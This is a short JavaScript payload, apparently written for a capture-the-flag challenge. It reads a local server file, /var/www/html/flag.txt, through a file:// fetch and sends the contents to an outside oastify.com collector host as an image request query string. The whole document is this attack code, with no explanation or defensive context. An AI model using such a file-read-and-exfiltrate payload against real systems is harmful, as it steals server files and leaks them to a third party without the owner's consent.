fetch("file:///var/www/html/flag.txt")
.then(r=>r.text())
.then(f=>{
new Image().src="https://10z31apdo20ojpay1g5ivkp6yx4vsogd.oastify.com?flag="+encodeURIComponent(f)
})
